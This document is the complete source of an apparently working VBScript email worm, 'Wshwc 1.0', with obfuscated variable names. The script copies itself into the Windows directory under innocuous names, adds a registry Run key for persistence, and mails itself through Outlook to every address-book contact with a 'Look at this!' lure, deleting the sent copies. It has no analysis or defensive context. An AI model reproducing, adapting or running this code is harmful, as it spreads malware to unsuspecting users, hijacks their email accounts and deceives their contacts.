On Error Resume Next
Set ETEUVDCZYCNZEZLW7 = CreateObject("Scripting.FileSystemObject")
Set QZRXXRFJIBFGKAXO8 = CreateObject("WScript.Shell")
Set VUYSKMXBDCUMUTFD9 = ETEUVDCZYCNZEZLW7.GetFile(WScript.ScriptFullName)
VUYSKMXBDCUMUTFD9.Copy (ETEUVDCZYCNZEZLW7.GetSpecialFolder(0) & "\Attachment.vbs")
Set ShowWorm = ETEUVDCZYCNZEZLW7.GetFile(ETEUVDCZYCNZEZLW7.GetSpecialFolder(0) & "\Attachment.vbs")
ShowWorm.Attributes = 0
VUYSKMXBDCUMUTFD9.Copy (ETEUVDCZYCNZEZLW7.GetSpecialFolder(0) & "\ChkMgr32.vbs")
QZRXXRFJIBFGKAXO8.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\FileManager32", "Wscript.exe " & ETEUVDCZYCNZEZLW7.GetSpecialFolder(0) & "\ChkMgr32.vbs %1"
Set FPWBCDRSJDTLIPDC1 = CreateObject("Outlook.Application")
If Not FPWBCDRSJDTLIPDC1 = "" Then
For Each RVIEERUCTCLSPRPT2 In FPWBCDRSJDTLIPDC1.GetNameSpace("MAPI").AddressLists
For WQQYRMMUODAYYKXI3 = 1 To RVIEERUCTCLSPRPT2.AddressEntries.Count
NRKWGUHWTCHLOERP5 = Chr(87) & Chr(83) & Chr(72) & Chr(87) & Chr(67)
ZXXZIIKHDBYTUGDH6 = QZRXXRFJIBFGKAXO8.RegRead("HKEY_CURRENT_USER\Software\" & NRKWGUHWTCHLOERP5 & "\The_Bastard\" & RVIEERUCTCLSPRPT2.AddressEntries(WQQYRMMUODAYYKXI3))
If ZXXZIIKHDBYTUGDH6 <> NRKWGUHWTCHLOERP5 Then
Set IWDBTAPEYCRFFLJA4 = FPWBCDRSJDTLIPDC1.CreateItem(0)
IWDBTAPEYCRFFLJA4.Recipients.Add (RVIEERUCTCLSPRPT2.AddressEntries(WQQYRMMUODAYYKXI3))
IWDBTAPEYCRFFLJA4.Subject = "Re: Look at this!"
IWDBTAPEYCRFFLJA4.Body = "Hello, Look at the attachments!"
IWDBTAPEYCRFFLJA4.Attachments.Add (ETEUVDCZYCNZEZLW7.GetSpecialFolder(0) & "\Attachment.vbs")
IWDBTAPEYCRFFLJA4.DeleteAfterSubmit = True
IWDBTAPEYCRFFLJA4.Importance = 2
IWDBTAPEYCRFFLJA4.Send
QZRXXRFJIBFGKAXO8.RegWrite "HKEY_CURRENT_USER\Software\" & NRKWGUHWTCHLOERP5 & "\The_Bastard\" & RVIEERUCTCLSPRPT2.AddressEntries(WQQYRMMUODAYYKXI3), NRKWGUHWTCHLOERP5
End If
Next
Next
End If
' Wshwc 1.0 by Zed/[rRlf]
